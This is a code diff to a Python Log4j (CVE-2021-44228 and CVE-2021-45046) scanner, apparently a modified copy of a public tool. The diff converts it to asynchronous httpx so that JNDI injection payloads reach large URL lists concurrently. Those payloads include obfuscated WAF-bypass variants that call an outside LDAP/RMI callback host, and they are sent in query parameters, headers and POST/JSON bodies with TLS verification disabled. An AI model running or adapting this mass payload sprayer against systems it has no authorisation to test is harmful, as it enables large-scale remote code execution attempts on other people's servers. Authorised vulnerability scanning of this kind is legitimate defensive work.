@@ -23,6 +23,10 @@ from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Hash import SHA256
 from termcolor import cprint
+import httpx
+import asyncio
+import pprint
+
 
 
 # Disable SSL warnings
@@ -48,7 +52,10 @@ default_headers = {
     'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
 }
 post_data_parameters = ["username", "user", "email", "email_address", "password"]
-timeout = 4
+timeout = httpx.Timeout(timeout=99999999, connect=4, pool=9999999)
+
+errors = {}
+succeeded = 0
 
 waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                        "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
@@ -278,7 +285,9 @@ def parse_url(url):
             "file_path": file_path})
 
 
-def scan_url(url, callback_host):
+async def scan_url(url, callback_host, client: httpx.AsyncClient):
+    cprint(f"[•] URL: {url}", "magenta")
+    global succeeded
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
     payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
@@ -287,54 +296,76 @@ def scan_url(url, callback_host):
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
     if args.cve_2021_45046:
         cprint(f"[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)", "yellow")
-        payloads = get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{callback_host}', random_string)
+        payloads.extend(get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
 
     for payload in payloads:
         cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
         if args.request_type.upper() == "GET" or args.run_all_tests:
             try:
-                requests.request(url=url,
+                await client.request(url=url,
                                  method="GET",
                                  params={"v": payload},
                                  headers=get_fuzzing_headers(payload),
-                                 verify=False,
+                                 # verify=False,
                                  timeout=timeout,
-                                 allow_redirects=(not args.disable_redirects),
-                                 proxies=proxies)
+                                 follow_redirects=(not args.disable_redirects),
+                                 # proxies=proxies
+                                 )
+                succeeded +=1
             except Exception as e:
-                cprint(f"EXCEPTION: {e}")
+
+                e_type = type(e)
+                errors.setdefault(e_type, 0)
+                errors[e_type] = errors[e_type] + 1
+                cprint(f"EXCEPTION: {e_type} {e}")
 
         if args.request_type.upper() == "POST" or args.run_all_tests:
             try:
                 # Post body
-                requests.request(url=url,
+                await client.request(url=url,
                                  method="POST",
                                  params={"v": payload},
                                  headers=get_fuzzing_headers(payload),
                                  data=get_fuzzing_post_data(payload),
-                                 verify=False,
+                                 # verify=False,
                                  timeout=timeout,
-                                 allow_redirects=(not args.disable_redirects),
-                                 proxies=proxies)
+                                 follow_redirects=(not args.disable_redirects),
+                                 # proxies=proxies
+                                 )
+                succeeded += 1
             except Exception as e:
-                cprint(f"EXCEPTION: {e}")
+                e_type = type(e)
+                errors.setdefault(e_type, 0)
+                errors[e_type] = errors[e_type] + 1
+                cprint(f"EXCEPTION: {e_type} {e}")
 
             try:
                 # JSON body
-                requests.request(url=url,
+                await client.request(url=url,
                                  method="POST",
                                  params={"v": payload},
                                  headers=get_fuzzing_headers(payload),
                                  json=get_fuzzing_post_data(payload),
-                                 verify=False,
+                                 # verify=False,
                                  timeout=timeout,
-                                 allow_redirects=(not args.disable_redirects),
-                                 proxies=proxies)
+                                 follow_redirects=(not args.disable_redirects),
+                                 # proxies=proxies
+                                 )
+                succeeded += 1
             except Exception as e:
-                cprint(f"EXCEPTION: {e}")
+                e_type = type(e)
+                errors.setdefault(e_type, 0)
+                errors[e_type] = errors[e_type] + 1
+                cprint(f"EXCEPTION: {e_type} {e}")
 
 
-def main():
+def chunks(lst, n):
+    """Yield successive n-sized chunks from lst."""
+    for i in range(0, len(lst), n):
+        yield lst[i:i + n]
+
+
+async def main():
     urls = []
     if args.url:
         urls.append(args.url)
@@ -361,9 +392,22 @@ def main():
         dns_callback_host = dns_callback.domain
 
     cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
-    for url in urls:
-        cprint(f"[•] URL: {url}", "magenta")
-        scan_url(url, dns_callback_host)
+    async with httpx.AsyncClient(
+        verify=False, 
+        limits=httpx.Limits(max_connections=30, max_keepalive_connections=20),
+        timeout=timeout,
+        ) as client:
+        for url_chunk in chunks(urls, 1000):
+            tasks = []
+            for url in url_chunk:
+                tasks.append(asyncio.create_task(scan_url(url, dns_callback_host, client=client)))
+            await asyncio.gather(*tasks)
+        
+    cprint(f"Succeeded connections: {succeeded}", "magenta")
+
+
+    cprint(f"Failures: \n{pprint.pformat(errors, width=4, indent=3)}", "magenta")
+    
 
     if args.custom_dns_callback_host:
         cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
@@ -383,7 +427,7 @@ def main():
 
 if __name__ == "__main__":
     try:
-        main()
+        asyncio.run(main())
     except KeyboardInterrupt:
         print("\nKeyboardInterrupt Detected.")
         print("Exiting...")
